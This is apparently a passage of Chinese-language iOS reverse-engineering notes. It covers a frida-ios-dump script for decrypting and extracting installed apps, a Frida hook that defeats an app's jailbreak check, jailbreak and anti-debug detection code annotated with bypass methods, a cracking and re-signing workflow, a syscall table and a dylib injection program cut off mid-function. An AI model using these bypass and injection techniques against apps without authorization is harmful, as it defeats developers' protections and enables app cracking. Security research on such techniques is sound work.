    device_manager.off('changed', on_changed)

    return device


def generate_ipa(path, display_name):
    ipa_filename = display_name + '.ipa'

    logger.info('Generating "{}"'.format(ipa_filename))
    try:
        app_name = file_dict['app']

        for key, value in file_dict.items():
            from_dir = os.path.join(path, key)
            to_dir = os.path.join(path, app_name, value)
            if key != 'app':
                shutil.move(from_dir, to_dir)

        target_dir = './' + PAYLOAD_DIR
        zip_args = ('zip', '-qr', os.path.join(os.getcwd(), ipa_filename), target_dir)
        subprocess.check_call(zip_args, cwd=TEMP_DIR)
        shutil.rmtree(PAYLOAD_PATH)
    except Exception as e:
        print(e)
        finished.set()

def on_message(message, data):
    t = tqdm(unit='B',unit_scale=True,unit_divisor=1024,miniters=1)
    last_sent = [0]

    def progress(filename, size, sent):
        t.desc = os.path.basename(filename).decode("utf-8")
        t.total = size
        t.update(sent - last_sent[0])
        last_sent[0] = 0 if size == sent else sent

    if 'payload' in message:
        payload = message['payload']
        if 'dump' in payload:
            origin_path = payload['path']
            dump_path = payload['dump']

            scp_from = dump_path
            scp_to = PAYLOAD_PATH + '/'

            with SCPClient(ssh.get_transport(), progress = progress, socket_timeout = 60) as scp:
                scp.get(scp_from, scp_to)

            chmod_dir = os.path.join(PAYLOAD_PATH, os.path.basename(dump_path))
            chmod_args = ('chmod', '655', chmod_dir)
            try:
                subprocess.check_call(chmod_args)
            except subprocess.CalledProcessError as err:
                print(err)

            index = origin_path.find('.app/')
            file_dict[os.path.basename(dump_path)] = origin_path[index + 5:]

        if 'app' in payload:
            app_path = payload['app']

            scp_from = app_path
            scp_to = PAYLOAD_PATH + '/'
            with SCPClient(ssh.get_transport(), progress = progress, socket_timeout = 60) as scp:
                scp.get(scp_from, scp_to, recursive=True)

            chmod_dir = os.path.join(PAYLOAD_PATH, os.path.basename(app_path))
            chmod_args = ('chmod', '755', chmod_dir)
            try:
                subprocess.check_call(chmod_args)
            except subprocess.CalledProcessError as err:
                print(err)

            file_dict['app'] = os.path.basename(app_path)

        if 'done' in payload:
            finished.set()
    t.close()

def compare_applications(a, b):
    a_is_running = a.pid != 0
    b_is_running = b.pid != 0
    if a_is_running == b_is_running:
        if a.name > b.name:
            return 1
        elif a.name < b.name:
            return -1
        else:
            return 0
    elif a_is_running:
        return -1
    else:
        return 1


def get_applications(device):
    try:
        applications = device.enumerate_applications()
    except Exception as e:
        sys.exit('Failed to enumerate applications: %s' % e)

    return applications


def load_js_file(session, filename):
    source = ''
    with codecs.open(filename, 'r', 'utf-8') as f:
        source = source + f.read()
    script = session.create_script(source)
    script.on('message', on_message)
    script.load()

    return script


def create_dir(path):
    path = path.strip()
    path = path.rstrip('\\')
    if os.path.exists(path):
        shutil.rmtree(path)
    try:
        os.makedirs(path)
    except os.error as err:
        print(err)


def open_target_app(device, name_or_bundleid):
    logger.info('Start the target app {}'.format(name_or_bundleid))

    pid = ''
    session = None
    display_name = ''
    bundle_identifier = ''
    for application in get_applications(device):
        if name_or_bundleid == application.identifier or name_or_bundleid == application.name:
            pid = application.pid
            display_name = application.name
            bundle_identifier = application.identifier

    try:
        if not pid:
            pid = device.spawn([bundle_identifier])
            session = device.attach(pid)
            device.resume(pid)
        else:
            session = device.attach(pid)
    except Exception as e:
        print(e) 

    return session, display_name, bundle_identifier


def start_dump(session, ipa_name):
    logger.info('Dumping {} to {}'.format(display_name, TEMP_DIR))

    script = load_js_file(session, DUMP_JS)
    script.post('dump')
    finished.wait()

    generate_ipa(PAYLOAD_PATH, ipa_name)

    if session:
        session.detach()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='frida-ios-dump (by AloneMonkey v2.0)')
    parser.add_argument('-l', '--list', dest='list_applications', action='store_true', help='List the installed apps')
    parser.add_argument('-o', '--output', dest='output_ipa', help='Specify name of the decrypted IPA')
    parser.add_argument('target', nargs='?', help='Bundle identifier or display name of the target app')
    args = parser.parse_args()

    exit_code = 0
    ssh = None

    if not len(sys.argv[1:]):
        parser.print_help()
        sys.exit(exit_code)

    device = get_usb_iphone()

    if args.list_applications:
        list_applications(device)
    else:
        name_or_bundleid = args.target
        output_ipa = args.output_ipa

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(Host, port=Port, username=User, password=Password)

            create_dir(PAYLOAD_PATH)
            (session, display_name, bundle_identifier) = open_target_app(device, name_or_bundleid)
            if output_ipa is None:
                output_ipa = display_name
            output_ipa = re.sub('\.ipa$', '', output_ipa)
            if session:
                start_dump(session, output_ipa)
        except paramiko.ssh_exception.NoValidConnectionsError as e:
            print(e) 
            exit_code = 1
        except paramiko.AuthenticationException as e:
            print(e) 
            exit_code = 1
        except Exception as e:
            print('*** Caught exception: %s: %s' % (e.__class__, e))
            traceback.print_exc()
            exit_code = 1

    if ssh:
        ssh.close()

    if os.path.exists(PAYLOAD_PATH):
        shutil.rmtree(PAYLOAD_PATH)

    sys.exit(exit_code)
```

## 屏蔽越狱检测脚本
```
function bypassJailbreakDetection() {
	try {
		var className = "JailbreakDetection";
        var funcName = "+ isJail";
        var hook = eval('ObjC.classes.' + className + '["' + funcName + '"]');
        Interceptor.attach(hook.implementation, {
          onLeave: function(retval) {
            console.log("[*] Class Name: " + className);
            console.log("[*] Method Name: " + funcName);
            console.log("\t[-] Type of return value: " + typeof retval);
            console.log("\t[-] Original Return Value: " + retval);
            retval.replace(0x0);
            console.log("\t[-] Type of return value: " + typeof retval);
            console.log("\t[-] Return Value: " + retval);
          }
        });
        
	} catch(err) {
		console.log("[-] Error: " + err.message);
	}
}

if (ObjC.available) {
	bypassJailbreakDetection();
} else {
 	send("error: Objective-C Runtime is not available!");
}
```

## 反iOS越狱检测
```
#import <UIKit/UIKit.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>
#import <objc/runtime.h>
#import <objc/message.h>
#include <stdio.h>
#import <dlfcn.h>
#import <sys/types.h>

static char *JbPaths[] = {"/Applications/Cydia.app",
    "/usr/sbin/sshd",
    "/bin/bash",
    "/etc/apt",
    "/Library/MobileSubstrate",
    "/User/Applications/"};

static NSSet *sDylibSet ; // 需要检测的动态库
static BOOL SCHECK_USER = NO; /// 检测是否越狱

@implementation UserCust


+ (void)load {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    sDylibSet  = [NSSet setWithObjects:
                       @"/usr/lib/CepheiUI.framework/CepheiUI",
                       @"/usr/lib/libsubstitute.dylib",
                       @"/usr/lib/substitute-inserter.dylib",
                       @"/usr/lib/substitute-loader.dylib",
                       @"/usr/lib/substrate/SubstrateLoader.dylib",
                       @"/usr/lib/substrate/SubstrateInserter.dylib",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/Library/MobileSubstrate/DynamicLibraries/0Shadow.dylib",
                  
                  nil];
    _dyld_register_func_for_add_image(_check_image);
  });
}

+ (instancetype)sharedInstance {
    
    static id sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [self new];
    });
    return sharedInstance;
}

// 监听image加载，从这里判断动态库是否加载，因为其他的检测动态库的方案会被hook
static void _check_image(const struct mach_header *header,
                                      intptr_t slide) {
  // hook Image load
  if (SCHECK_USER) {
    // 检测后就不在检测
    return;
  }

  // 检测的lib
  Dl_info info;
  // 0表示加载失败了，这里大概率是被hook导致的
  if (dladdr(header, &info) == 0) {
    char *dlerro = dlerror();
    // 获取失败了 但是返回了dli_fname, 说明被人hook了，目前看的方案都是直接返回0来绕过的
    if(dlerro == NULL && info.dli_fname != NULL) {
      NSString *libName = [NSString stringWithUTF8String:info.dli_fname];
      // 判断有没有在动态列表里面
      if ([sDylibSet containsObject:libName]) {
        SCHECK_USER = YES;
      }
    }
    return;
  }
}


// 越狱检测
- (BOOL)UVItinitse {
  
    if (SCHECK_USER) {
      return YES;
    }

    if (isStatNotSystemLib()) {
        return YES;
    }

    if (isDebugged()) {
        return YES;
    }

    if (isInjectedWithDynamicLibrary()) {
        return YES;
    }

    if (JCheckKuyt()) {
        return YES;
    }

    if (dyldEnvironmentVariables()) {
        return YES;
    }

    return NO;
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

#pragma mark 使用NSFileManager通过检测一些越狱后的关键文件是否可以访问来判断是否越狱
// 检测越狱
BOOL JCheckKuyt()
{
    
    if(TARGET_IPHONE_SIMULATOR)return NO;

    //Check cydia URL hook canOpenURL 来绕过
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }

    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]])
    {
        return YES;
    }

    NSArray* checks = [[NSArray alloc] initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app"
                       @"/var/lib/dpkg/info", nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    // hook lstat可以绕过
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            return YES;
        }
    }
  

    //Check process forking
    // hook fork
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        return YES;
    }

  
//     check has class only used in breakJail like HBPreferences. 越狱常用的类，这里无法绕过，只要多找一些特征类就可以，注意，很多反越狱插件会混淆，所以可能要通过查关键方法来识别
    NSArray *checksClass = [[NSArray alloc] initWithObjects:@"HBPreferences",nil];
    for(NSString *className in checksClass)
    {
      if (NSClassFromString(className) != NULL) {
        return YES;
      }
    }
  
//    Check permission to write to /private hook FileManager 和 writeToFile来绕过
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:path atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            return YES;
        }

        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

BOOL isInjectedWithDynamicLibrary()
{
  unsigned int outCount = 0;
  const char **images =  objc_copyImageNames(&outCount);
  for (int i = 0; i < outCount; i++) {
      printf("%s\n", images[i]);
  }
  
  
  int i=0;
    while(true){
        // hook _dyld_get_image_name方法可以绕过
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
          NSString *libName = [NSString stringWithUTF8String:name];
          if ([sDylibSet containsObject:libName]) {
            return YES;
          }

        }
    }
    return NO;
}

#pragma mark 通过环境变量DYLD_INSERT_LIBRARIES检测是否越狱
BOOL dyldEnvironmentVariables ()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !(NULL == getenv("DYLD_INSERT_LIBRARIES"));
}

#pragma mark 校验当前进程是否为调试模式，hook sysctl方法可以绕过
// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

#pragma mark 使用stat通过检测一些越狱后的关键文件是否可以访问来判断是否越狱，hook stat 方法和dladdr可以绕过
BOOL isStatNotSystemLib() {
    if(TARGET_IPHONE_SIMULATOR)return NO;
    int ret ;
    Dl_info dylib_info;
    int (*func_stat)(const char *, struct stat *) = stat;
    if ((ret = dladdr(func_stat, &dylib_info))) {
        NSString *fName = [NSString stringWithUTF8String: dylib_info.dli_fname];
        if(![fName isEqualToString:@"/usr/lib/system/libsystem_kernel.dylib"]){
            return YES;
        }
    }
    
    for (int i = 0;i < sizeof(JbPaths) / sizeof(char *);i++) {
        struct stat stat_info;
        if (0 == stat(JbPaths[i], &stat_info)) {
            return YES;
        }
    }
    
    return NO;
}

typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);

#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

// 禁止gdb调试
- (void) disable_gdb {
    if(TARGET_IPHONE_SIMULATOR)return;
    void* handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    ptrace_ptr_t ptrace_ptr = dlsym(handle, "ptrace");
    ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
    dlclose(handle);
}

@end

```

## iOS逆向App流程
```
1. Clutch、frida, CrackXI 砸壳ipa；

2. class-dump导出class类头文件；

3. Reveal、Cycript, FLEX分析界面；

4. 分析类关系、函数调用逻辑，尝试进行hook；

5. theos调试、编译、打包、注入dylib；

6. codesign重签名、发布；
```

## debugserver - iOS逆向调试

一 lldb调试原理：debugserver
xcode的lldb之所以能调试app，是因为手机运行app，lldb会把调试指令发给手机的debugServer; 
debugServer是由Xcode第一次运行程序给安装到手机上。

Xcode上查看debugserver：
按住command键点击Xcode，找到xcode.app显示包内容/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/15.0 
找到DeveloperDiskImage.dmg 里的usr -> bin -> debugserver

手机的根目录下的 Developer -> usr -> bin 里能找到debugserver，越狱手机可以查看
越狱环境下，lldb连接手机的debugserver,然后就可以通过debugserver调试某个app

debugserver如何调试app？

## ptrace函数
debugserver通过ptrace函数调试app
ptrace是系统函数，此函数提供一个进程去监听和控制另一个进程，
并且可以检测被控制进程的内存和寄存器里面的数据。ptrace可以用来实现断点调试和系统调用跟踪。

## FutureRestore-GUI:  https://github.com/CoocooFroggy/FutureRestore-GUI
![](https://github.com/CoocooFroggy/FutureRestore-GUI/blob/master/.github/Light.png?raw=true)
![](https://github.com/CoocooFroggy/FutureRestore-GUI/blob/master/.github/Dark.png?raw=true)

### 命令行安装FutureRestore-GUI

Mac利用brew命令行安装
```
macOS: brew install futurerestore-gui
```
Windows利用winget命令行安装
```
Windows: winget install futurerestore-gui
```

## -----------------------------------

## iOS内嵌内嵌汇编指令 - ios-syscalls
```
1	__exit
2	fork
3	read
4	write
5	__open
6	close
7	__wait4
9	_kernelrpc_mach_vm_allocate_trap
9	link
10	__unlink
11	_kernelrpc_mach_vm_deallocate_trap
12	chdir
13	_kernelrpc_mach_vm_protect_trap
13	fchdir
14	_kernelrpc_mach_vm_map_trap
14	mknod
15	__chmod
15	_kernelrpc_mach_port_allocate_trap
16	_kernelrpc_mach_port_destroy_trap
16	chown
17	_kernelrpc_mach_port_deallocate_trap
18	_kernelrpc_mach_port_mod_refs_trap
19	_kernelrpc_mach_port_move_member_trap
20	_kernelrpc_mach_port_insert_right_trap
21	_kernelrpc_mach_port_insert_member_trap
22	_kernelrpc_mach_port_extract_member_trap
23	_kernelrpc_mach_port_construct_trap
23	setuid
24	_kernelrpc_mach_port_destruct_trap
24	getuid
25	geteuid
25	mach_reply_port
26	thread_self_trap
27	__recvmsg
27	__recvmsg
27	task_self_trap
28	__sendmsg
28	__sendmsg
28	host_self_trap
29	__recvfrom
29	__recvfrom
30	__accept
30	__accept
30	mach_msg_trap
31	__getpeername
31	__getpeername
31	mach_msg_overwrite_trap
32	__getsockname
32	__getsockname
32	semaphore_signal_trap
33	access
33	semaphore_signal_all_trap
34	chflags
34	semaphore_signal_thread_trap
35	fchflags
35	semaphore_wait_trap
36	semaphore_wait_signal_trap
36	sync
37	__kill
37	semaphore_timedwait_trap
38	semaphore_timedwait_signal_trap
39	getppid
40	_kernelrpc_mach_port_guard_trap
41	_kernelrpc_mach_port_unguard_trap
41	dup
43	getegid
43	task_name_for_pid
44	task_for_pid
45	pid_for_task
46	__sigaction
47	getgid
47	macx_swapon
48	macx_swapoff
48	sigprocmask
49	__getlogin
50	__setlogin
50	macx_triggers
51	acct
51	macx_backing_store_suspend
52	macx_backing_store_recovery
52	sigpending
53	__sigaltstack
54	__ioctl
55	reboot
56	revoke
57	symlink
58	readlink
58	swtch_pri
59	execve
59	swtch
60	syscall_thread_switch
60	umask
61	chroot
61	clock_sleep_trap
65	__msync
65	__msync
73	__munmap
74	__mprotect
74	__mprotect
75	madvise
75	madvise
78	mincore
79	getgroups
80	setgroups
81	getpgrp
82	setpgid
83	setitimer
85	swapon
86	getitimer
88	mach_timebase_info
89	getdtablesize
89	mach_wait_until
90	dup2
90	mk_timer_create
91	mk_timer_destroy
92	__fcntl
92	mk_timer_arm
93	__select
93	__select
93	mk_timer_cancel
95	fsync
96	__setpriority
97	socket
98	__connect
98	__connect
100	getpriority
104	__bind
104	__bind
105	setsockopt
106	__listen
106	__listen
111	__sigsuspend
117	getrusage
118	getsockopt
120	readv
121	writev
122	__settimeofday
123	fchown
124	__fchmod
126	__setreuid
126	__setreuid
127	__setregid
127	__setregid
128	__rename
131	flock
132	mkfifo
133	__sendto
133	__sendto
134	shutdown
135	__socketpair
135	__socketpair
136	mkdir
137	__rmdir
138	utimes
139	futimes
140	adjtime
142	__gethostuuid
147	setsid
148	setquota
149	quota
151	getpgid
152	setprivexec
153	pread
154	pwrite
155	nfssvc
159	unmount
161	getfh
165	quotactl
167	mount
169	csops
170	csops_audittoken
173	waitid
178	__kdebug_trace_string
179	__kdebug_trace64
180	__kdebug_trace
181	setgid
182	setegid
183	seteuid
184	__sigreturn
185	__chud
187	fdatasync
191	pathconf
192	fpathconf
194	__getrlimit
195	__setrlimit
196	getdirentries
197	__mmap
199	__lseek
199	__lseek
200	truncate
201	ftruncate
202	__sysctl
203	mlock
204	munlock
205	undelete
216	__open_dprotected_np
220	__getattrlist
220	__getattrlist
221	__setattrlist
221	__setattrlist
222	getdirentriesattr
223	exchangedata
225	searchfs
226	__delete
227	__copyfile
228	fgetattrlist
229	fsetattrlist
230	poll
231	watchevent
232	waitevent
233	modwatch
234	getxattr
235	fgetxattr
236	setxattr
237	fsetxattr
238	removexattr
239	fremovexattr
240	listxattr
241	flistxattr
242	fsctl
243	__initgroups
244	__posix_spawn
245	ffsctl
247	nfsclnt
248	fhopen
250	minherit
251	__semsys
252	__msgsys
253	__shmsys
254	__semctl
255	semget
256	semop
258	__msgctl
258	__msgctl
259	msgget
260	msgsnd
261	msgrcv
262	shmat
263	__shmctl
263	__shmctl
264	shmdt
265	shmget
266	__shm_open
267	shm_unlink
268	__sem_open
269	sem_close
270	sem_unlink
271	sem_wait
272	sem_trywait
273	sem_post
274	__sysctlbyname
277	__open_extended
278	__umask_extended
279	__stat_extended
280	__lstat_extended
281	__fstat_extended
282	__chmod_extended
283	__fchmod_extended
284	__access_extended
284	__access_extended
285	__settid
285	__settid
286	__gettid
286	__gettid
287	__setsgroups
287	__setsgroups
288	__getsgroups
288	__getsgroups
289	__setwgroups
289	__setwgroups
290	__getwgroups
290	__getwgroups
291	__mkfifo_extended
292	__mkdir_extended
293	__identitysvc
294	__shared_region_check_np
296	vm_pressure_monitor
297	__psynch_rw_longrdlock
298	__psynch_rw_yieldwrlock
299	__psynch_rw_downgrade
300	__psynch_rw_upgrade
301	__psynch_mutexwait
302	__psynch_mutexdrop
303	__psynch_cvbroad
304	__psynch_cvsignal
305	__psynch_cvwait
306	__psynch_rw_rdlock
307	__psynch_rw_wrlock
308	__psynch_rw_unlock
309	__psynch_rw_unlock2
310	getsid
311	__settid_with_pid
312	__psynch_cvclrprepost
313	aio_fsync
314	aio_return
315	aio_suspend
316	aio_cancel
317	aio_error
318	aio_read
319	aio_write
320	lio_listio
322	__iopolicysys
323	__process_policy
324	mlockall
325	munlockall
327	issetugid
328	__pthread_kill
329	__pthread_sigmask
330	__sigwait
331	__disable_threadsignal
332	__pthread_markcancel
333	__pthread_canceled
334	__semwait_signal
336	__proc_info
337	sendfile
338	stat
338	stat
339	fstat
339	fstat
340	lstat
340	lstat
341	__stat64_extended
342	__lstat64_extended
343	__fstat64_extended
344	__getdirentries64
345	statfs
345	statfs
346	fstatfs
346	fstatfs
347	getfsstat
347	getfsstat
348	__pthread_chdir
349	__pthread_fchdir
350	audit
351	auditon
353	getauid
354	setauid
357	getaudit_addr
358	setaudit_addr
359	auditctl
360	__bsdthread_create
361	__bsdthread_terminate
362	kqueue
363	kevent
364	__lchown
364	__lchown
365	__stack_snapshot
366	__bsdthread_register
367	__workq_open
368	__workq_kernreturn
369	kevent64
370	__old_semwait_signal
371	____old_semwait_signal_nocancel
372	__thread_selfid
373	ledger
374	kevent_qos
380	__mac_execve
380	__mac_execve
381	__mac_syscall
381	__mac_syscall
382	__mac_get_file
383	__mac_set_file
384	__mac_get_link
385	__mac_set_link
386	__mac_get_proc
387	__mac_set_proc
387	__mac_set_proc
388	__mac_get_fd
389	__mac_set_fd
390	__mac_get_pid
396	__read_nocancel
396	__read_nocancel
397	__write_nocancel
397	__write_nocancel
398	__open_nocancel
399	__close_nocancel
399	__close_nocancel
400	__wait4_nocancel
400	__wait4_nocancel
401	__recvmsg_nocancel
401	__recvmsg_nocancel
402	__sendmsg_nocancel
402	__sendmsg_nocancel
403	__recvfrom_nocancel
403	__recvfrom_nocancel
404	__accept_nocancel
404	__accept_nocancel
405	__msync_nocancel
405	__msync_nocancel
406	__fcntl_nocancel
407	__select_nocancel
407	__select_nocancel
408	__fsync_nocancel
408	__fsync_nocancel
409	__connect_nocancel
409	__connect_nocancel
410	__sigsuspend_nocancel
411	__readv_nocancel
411	__readv_nocancel
412	__writev_nocancel
412	__writev_nocancel
413	__sendto_nocancel
413	__sendto_nocancel
414	__pread_nocancel
414	__pread_nocancel
415	__pwrite_nocancel
415	__pwrite_nocancel
416	__waitid_nocancel
416	__waitid_nocancel
417	__poll_nocancel
417	__poll_nocancel
418	__msgsnd_nocancel
418	__msgsnd_nocancel
419	__msgrcv_nocancel
419	__msgrcv_nocancel
420	__sem_wait_nocancel
420	__sem_wait_nocancel
421	__aio_suspend_nocancel
421	__aio_suspend_nocancel
422	____sigwait_nocancel
423	__semwait_signal_nocancel
424	__mac_mount
424	__mac_mount
425	__mac_get_mount
426	__mac_getfsstat
427	__fsgetpath
428	audit_session_self
429	audit_session_join
430	fileport_makeport
431	fileport_makefd
432	audit_session_port
433	pid_suspend
434	pid_resume
435	pid_hibernate
436	pid_shutdown_sockets
438	__shared_region_map_and_slide_np
439	kas_info
440	memorystatus_control
441	__guarded_open_np
442	guarded_close_np
443	guarded_kqueue_np
444	change_fdguard_np
446	proc_rlimit_control
447	connectx
448	disconnectx
449	peeloff
450	socket_delegate
451	__telemetry
452	proc_uuid_policy
453	memorystatus_get_level
454	system_override
455	vfs_purge
456	__sfi_ctl
457	__sfi_pidctl
458	__coalition
459	__coalition_info
460	necp_match_policy
461	getattrlistbulk
463	__openat
464	__openat_nocancel
465	__renameat
466	faccessat
467	fchmodat
468	fchownat
470	fstatat
470	fstatat
471	linkat
472	__unlinkat
473	readlinkat
474	symlinkat
475	mkdirat
476	getattrlistat
477	proc_trace_log
478	__bsdthread_ctl
479	openbyid_np
480	recvmsg_x
481	sendmsg_x
482	__thread_selfusage
483	__csrctl
484	__guarded_open_dprotected_np
485	guarded_write_np
486	guarded_pwrite_np
487	guarded_writev_np
488	__rename_ext
489	mremap_encrypted
490	netagent_trigger
491	__stack_snapshot_with_config
492	__microstackshot
493	grab_pgo_data
499	__work_interval_ctl
```

iOS动态库注入工具：cynject、yololib、insert_dylib、optool、install_name_tool

## Cycript

cycript是大神saurik开发的一个非常强大的工具,
可以让开发者在命令行下和应用交互,在运行时查看和修改应用。
底层实现: 是通过苹果的JavaScriptCore.framework来打通iOS与javascript的桥梁(OC和JS互相调用)

## -----------------------------------

## install_name_tool 注入动态库 使用说明

     （1）@executable_path。这个path很少用，本质上就是可执行程序的路径。在动态库中基本上不使用这个path.

      (2) @loader_path。这个path在之前的应用中用的非常多，可以通过这个path来设置动态库的install path name。
      但是它有自己的局限性，就是当一个动态库同时被多个程序引用时，如果位置不一样的话仍然需要手动修改。这个在参考链接中有说明。  
      (3) @rpath  它是run path的缩写。本质上它不是一个明确的path，甚至可以说它不是一个path。
      它只是一个变量，或者叫占位符。这个变量通过XCode中的run path选项设置值，或者通过install_name_tool的-add_rpath设置值。
      设置好run path之后，所有的@rpath都会被替换掉。此外，run path是可以设置多个值的
      
```
INSTALL_NAME_TOOL(1)					      General Commands Manual					      INSTALL_NAME_TOOL(1)

NAME

       install_name_tool - change dynamic shared library install names

SYNOPSIS

       install_name_tool [-change old new ] ... [-rpath old new ] ... [-add_rpath new ] ... [-delete_rpath new ] ... [-id name] file

DESCRIPTION

       Install_name_tool  changes the dynamic shared library install names and or adds, changes or deletes the rpaths recorded in a Mach-O binary.
       For this tool to work when the install names or rpaths are larger the binary should be built with  the  ld(1)  -headerpad_max_install_names
       option.

       -change old new
	      Changes  the dependent shared library install name old to new in the specified Mach-O binary.  More than one of these options can be
	      specified.  If the Mach-O binary does not contain the old install name in a specified -change option the option is ignored.

       -id name
	      Changes the shared library identification name of a dynamic shared library to name.  If the Mach-O binary is not	a  dynamic  shared
	      library and the -id option is specified it is ignored.

       -rpath old new
	      Changes  the  rpath  path  name old to new in the specified Mach-O binary.  More than one of these options can be specified.  If the
	      Mach-O binary does not contain the old rpath path name in a specified -rpath it is an error.

       -add_rpath new
	      Adds the rpath path name new in the specified Mach-O binary.  More than one of these options can be specified.  If the Mach-O binary
	      already contains the new rpath path name specified in -add_rpath it is an error.

       -delete_rpath old
	      deletes  the  rpath  path  name old in the specified Mach-O binary.  More than one of these options can be specified.  If the Mach-O
	      binary does not contains the old rpath path name specified in -delete_rpath it is an error.

```

## 基于cynject注入dylib
```
#include <sys/cdefs.h>
#include <sys/types.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <mach/boolean.h>
#include <dispatch/dispatch.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <spawn.h>
#include <assert.h>
extern char ***_NSGetEnviron(void);
extern int proc_listallpids(void *, int);
extern int proc_pidpath(int, void *, uint32_t);
static const char *cynject_path = "/usr/bin/cynject";
static const char *dispatch_queue_name = NULL;
static int process_buffer_size = 4096;
static pid_t process_pid = -1;
static boolean_t find_process(const char *name, pid_t *ppid_ret) {
    pid_t *pid_buffer;
    char path_buffer[MAXPATHLEN];
    int count, i, ret;
    boolean_t res = FALSE;
    
    pid_buffer = (pid_t *)calloc(1, process_buffer_size);
    assert(pid_buffer != NULL);
    
    count = proc_listallpids(pid_buffer, process_buffer_size);
    if (count) {
        for (i = 0; i < count; i++) {
            pid_t ppid = pid_buffer[i];
            
            ret = proc_pidpath(ppid, (void *)path_buffer, sizeof(path_buffer));
            if (ret < 0) {
                printf("(%s:%d) proc_pidinfo() call failed.\n", __FILE__, __LINE__);
                continue;
            }
            
            if (strstr(path_buffer, name)) {
                res = TRUE;
                *ppid_ret = ppid;
                break;
            }
        }
    }
    
    free(pid_buffer);
    return res;
}
static void inject_dylib(const char *name, pid_t pid, const char *dylib) {
    char **argv;
    char pid_buf[32];
    int res;
    pid_t child;
    
    argv = calloc(4, sizeof(char *));
    assert(argv != NULL);
    
    snprintf(pid_buf, sizeof(pid_buf), "%d", pid);
    
    argv[0] = (char *)name;
    argv[1] = (char *)pid_buf;
    argv[2] = (char *)dylib;
    argv[3] = NULL;
    
    printf("(%s:%d) calling \"%s %s %s\"\n", __FILE__, __LINE__, argv[0], argv[1], argv[2]);
    
